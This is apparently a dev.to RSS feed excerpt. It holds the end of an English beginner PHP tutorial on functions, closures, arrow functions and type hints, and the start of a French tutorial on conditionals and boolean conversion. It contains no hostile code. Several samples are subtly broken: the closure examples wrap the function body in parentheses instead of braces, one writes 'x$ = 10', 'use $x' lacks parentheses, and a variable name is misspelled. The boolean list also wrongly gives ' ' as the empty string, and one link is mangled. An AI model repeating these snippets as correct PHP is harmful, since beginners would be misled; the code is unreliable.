&lt;p&gt;Since version 8 of PHP it is possible to launch a function by naming the parameters. The call is clearer and the order of the parameters does not have to be respected.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#return"&gt;
  &lt;/a&gt;
  Return
&lt;/h3&gt;

&lt;p&gt;Returns a value when calling the function.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Doe'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the function returns a concatenated string with first name and last name&lt;/p&gt;

&lt;p&gt;The echo function will display on the web page the value returned by the fullName() function&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#anonymous-functions-closure"&gt;
  &lt;/a&gt;
  Anonymous functions (closure)
&lt;/h3&gt;

&lt;p&gt;Allows the creation of functions without specifying their name. Here is an example :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Anonymous functions end with a semicolon; And they can't access the parent context variables.&lt;/p&gt;

&lt;p&gt;It is possible to pass a variable from the parent context with the statement &lt;strong&gt;use&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 35&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#callback-functions"&gt;
  &lt;/a&gt;
  Callback functions
&lt;/h3&gt;

&lt;p&gt;Callback functions are anonymous functions passed as parameters. here is an example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Array ( [0] =&amp;gt; iPhone 12 [1] =&amp;gt; iPhone 13 )&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the array_filter() function has an anonymous function as second parameter.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h3&gt;

&lt;p&gt;Allows the use of a shortcut syntax:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that for the moment, the Arrow functions allow the execution of only one expression. Arrow functions are executed in the current context so they can use variables without having to use the &lt;strong&gt;use&lt;/strong&gt; statement.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#function-type-hint"&gt;
  &lt;/a&gt;
  Function Type Hint
&lt;/h3&gt;

&lt;p&gt;Note that functions can be typed (string, int, etc.). It is possible to define a type for each of the parameters and a type for the return value of the function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the $first and $last parameters must be of type string as well as the return value.&lt;/p&gt;

&lt;p&gt;There are several other things to know about typed functions, we will come back to this later.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#strict-type"&gt;
  &lt;/a&gt;
  Strict Type
&lt;/h3&gt;

&lt;p&gt;Here is an example of a function with type&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 30&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In this example the parameter $a is of type integer. However PHP does not return an error. The reason is that PHP will try to convert the string '10' to an integer. If the conversion is possible then no error is reported.&lt;/p&gt;

&lt;p&gt;There are times when you would like PHP to not allow this conversion and only execute if the parameter is really of the specified type. To do this you must add an instruction at the beginning of your file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;declare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strict_types&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// TypeError&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here an error is returned because the type of the parameter is not an integer&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;That's it for today, I'll be releasing a new article every two days or so. To be sure not to miss anything you can follow me on twitter: &lt;a href="https://twitter.com/EricTheCoder_"&gt;Follow @EricTheCoder_&lt;/a&gt;&lt;/p&gt;

</description>
      <category>php</category>
      <category>backends</category>
      <category>tutorial</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Apprendre le PHP : Conditions, boucles et fonctions</title>
      <author> Eric Le Codeur</author>
      <pubDate>Sun, 23 Jan 2022 18:02:22 +0000</pubDate>
      <link>https://dev.to/ericlecodeur/apprendre-le-php-conditions-boucles-et-fonctions-1ed1</link>
      <guid>https://dev.to/ericlecodeur/apprendre-le-php-conditions-boucles-et-fonctions-1ed1</guid>
      <description>&lt;p&gt;Aujourd'hui, vous apprendrez les conditions, les boucles et les fonctions&lt;/p&gt;

&lt;p&gt;Ce cours accéléré PHP est gratuit et sera publié ici sur dev.to. Je publierai un nouvel article tous les deux jours environ. Pour ne rien manquer, vous pouvez me suivre sur twitter : &lt;a href="https://twitter.com/EricLeCodeur"&gt;Follow @EricLeCodeur&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#ex%C3%A9cution-conditionnelle"&gt;
  &lt;/a&gt;
  Exécution conditionnelle
&lt;/h1&gt;

&lt;p&gt;En PHP, il est possible d’exécuter une ligne de code seulement si une condition est vraie.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le code inclut entre les parenthèses est ce que l’on appel une expression. PHP va exécuter ce code et retourner sa valeur booléenne (vrai ou faux). &lt;/p&gt;

&lt;p&gt;Si le résultat est ‘vrai’ alors le code contenu entre les { } sera exécuté.&lt;/p&gt;

&lt;p&gt;Si le résultat est faux, rien ne sera exécuté dans ce bloc 'if'&lt;/p&gt;

&lt;p&gt;Voici un autre exemple avec l’opérateur plus grand que '&amp;gt;'&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Il est possible d’exécuter du code si la condition est fausse&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici le mot-clé 'else' exécute le code si l’expression est ‘false’&lt;/p&gt;

&lt;p&gt;Enfin, il est possible d’avoir plusieurs conditions&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 19.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le mot-clé 'elseif' permet de tester une autre condition. À noter que cette condition sera testée seulement si la première condition est fausse.&lt;/p&gt;

&lt;p&gt;Si la première et la deuxième condition sont fausses, alors le code dans la section 'else' sera exécuté.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#op%C3%A9rateur-de-comparaison"&gt;
  &lt;/a&gt;
  Opérateur de comparaison
&lt;/h3&gt;

&lt;p&gt;Voici les différents opérateurs qui peuvent être utilisés dans les expressions.&lt;/p&gt;

&lt;p&gt;==   equal no type check&lt;br&gt;
===   equal with type check&lt;br&gt;
!=   not equal&lt;br&gt;
||   or&lt;br&gt;
&amp;amp;&amp;amp;   and&lt;br&gt;
&amp;gt;   greater than&lt;br&gt;
&amp;lt;   less than&lt;/p&gt;

&lt;p&gt;il est possible de tester plusieurs expressions en même temps avec l’opérateur &amp;amp;&amp;amp;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le prix est entre 1 et 49'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le même principe s’applique pour l’opérateur ou ||&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le prix est 100$ ou 200$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Les expressions sans opérateur de comparaison&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le montant n est pas de zéro'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici l’expression ($amount) ne contient pas d’opérateur de comparaison, malgré ce fait, ce code est valide. Pourquoi ? En PHP chaque expression est convertie en valeur booléenne. Donc ici 0 est convertie en faux. Toute autre valeur autre que zéro (ou null) serait convertie en vrai.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#convertion-en-valeur-bool%C3%A9enne"&gt;
  &lt;/a&gt;
  Convertion en valeur booléenne
&lt;/h3&gt;

&lt;p&gt;Voici la liste des valeurs qui seront converties en &lt;strong&gt;false&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;false&lt;/p&gt;

&lt;p&gt;0&lt;/p&gt;

&lt;p&gt;0.0&lt;/p&gt;

&lt;p&gt;null&lt;/p&gt;

&lt;p&gt;‘0’ (string égale à zéro)&lt;/p&gt;

&lt;p&gt;‘ ’ (string vide)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://dev.totableau%20vide"&gt; &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Toutes les autres valeurs seront converties en &lt;strong&gt;true&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#voici-quelques-exemples-de-conversion-en-valeur-bool%C3%A9enne"&gt;
  &lt;/a&gt;
  Voici quelques exemples de conversion en valeur booléenne
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$messsage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$messsage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is set'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is unset'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
